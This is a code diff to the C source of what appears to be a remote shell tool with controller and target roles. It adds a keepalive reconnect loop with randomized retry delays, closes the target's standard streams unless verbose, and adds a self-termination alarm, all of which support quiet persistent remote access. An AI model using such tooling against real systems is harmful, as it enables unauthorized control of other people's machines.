@@ -238,6 +238,12 @@ int main(int argc, char **argv){
 
 	int ruid, euid, rgid, egid;
 
+	struct sigaction act;
+  unsigned long tmp_ulong;
+  unsigned int retry;
+  struct timespec req;
+
+
 
   // First thing, check that our effective user id is also our real. We may be in a suid
   // situation where they differ. If so, propagate the euid now before we call the shell
@@ -472,10 +478,6 @@ int main(int argc, char **argv){
 		config->bindshell = 1;
 	}
 
-	if(config->keepalive){
-		config->timeout = 0;
-	}
-
 	/* Grab the ip address. */
 	if((argc - optind) == 1){
 		config->ip_addr = argv[optind];
@@ -592,32 +594,119 @@ int main(int argc, char **argv){
 		return(-1);
 	}
 
+	// Close unnecessary file descriptors in target.
+	if(io->target){
+		if(close(STDIN_FILENO) == -1){
+			report_error("main(): close(STDIN_FILENO): %s", strerror(errno));
+			return(-1);
+		}
+
+		if(!verbose){
+			if(close(STDOUT_FILENO) == -1){
+				report_error("main(): close(STDOUT_FILENO): %s", strerror(errno));
+				return(-1);
+			}
+
+			if(close(STDERR_FILENO) == -1){
+				report_error("main(): close(STDERR_FILENO): %s", strerror(errno));
+				return(-1);
+			}
+		}
+	}
+
+	// We will occasionally fork() children in certain conditions. We will never handle them directly.
+	if(signal(SIGCHLD, SIG_IGN) == SIG_ERR){
+		report_error("main(): signal(SIGCHLD, SIG_IGN): %s", strerror(errno));
+		return(-1);
+	}
 
 	/* Call the appropriate conductor. */
 	if(!io->target){
 		do{
-			// If this is set, we've run once already. Let's clean up the io struct.
-			if(io->init_complete){
-				clean_io();
-			}
 			retval = do_control();
+
+
 #ifdef OPENSSL
 			if(io->ssl){
 				SSL_shutdown(io->ssl);
 			}
 #endif
+
+			clean_io();
+
+			if(retval != -1 && config->bindshell && config->keepalive){
+
+				if(config->retry_stop){
+					tmp_ulong = rand();
+					retry = config->retry_start + (tmp_ulong % (config->retry_stop - config->retry_start));
+				}else{
+					retry = config->retry_start;
+				}
+
+				if(verbose){
+					printf("Retrying connection in %d seconds...\n", retry);
+				}
+				report_log("Controller: Retrying connection in %d seconds.", retry);
+
+				req.tv_sec = retry;
+				req.tv_nsec = 0;
+				nanosleep(&req, NULL);
+			}
+
 		} while(retval != -1 && config->keepalive);
+
 	}else{
+
 		do{
-			if(io->init_complete){
-				clean_io();
-			}
 			retval = do_target();
+
 #ifdef OPENSSL
 			if(io->ssl){
 				SSL_shutdown(io->ssl);
 			}
 #endif
+
+			clean_io();
+
+			if(retval != -1 && !config->bindshell && config->keepalive){
+
+				if(config->retry_stop){
+					tmp_ulong = rand();
+					retry = config->retry_start + (tmp_ulong % (config->retry_stop - config->retry_start));
+				}else{
+					retry = config->retry_start;
+				}
+
+				/* Sepuku when left alone too long. */
+				memset(&act, 0, sizeof(act));
+				act.sa_handler = seppuku;
+
+				if(sigaction(SIGALRM, &act, NULL) == -1){
+					report_error("main(): sigaction(%d, %lx, %p): %s", SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+					return(-1);
+				}
+
+				alarm(config->timeout);
+
+				if(verbose){
+					printf("Retrying in %d seconds...\r\n", retry);
+				}
+
+				req.tv_sec = retry;
+				req.tv_nsec = 0;
+				nanosleep(&req, NULL);
+
+				act.sa_handler = SIG_DFL;
+
+				if(sigaction(SIGALRM, &act, NULL) == -1){
+					report_error("main(): sigaction(%d, %lx, %p): %s", SIGALRM, (unsigned long) &act, NULL, strerror(errno));
+					return(-1);
+				}
+
+				alarm(0);
+
+			}
+
 		} while(retval != -1 && config->keepalive);
 	}
 
@@ -652,6 +741,7 @@ void clean_io(){
 		io->local_in_fd = 0;
 		io->local_out_fd = 0;
 	}
+
 	close(io->remote_fd);
 
 	io->interactive = 0;
@@ -665,6 +755,7 @@ void clean_io(){
 
 	if(io->message.data){
 		free(io->message.data);
+		io->message.data = NULL;
 	}
 	memset(&(io->message), 0, sizeof(struct message_helper));
 
@@ -729,3 +820,5 @@ int posix_openpt(int flags){
 	return open("/dev/ptmx", flags);
 }
 #endif /* FREEBSD */
+
+
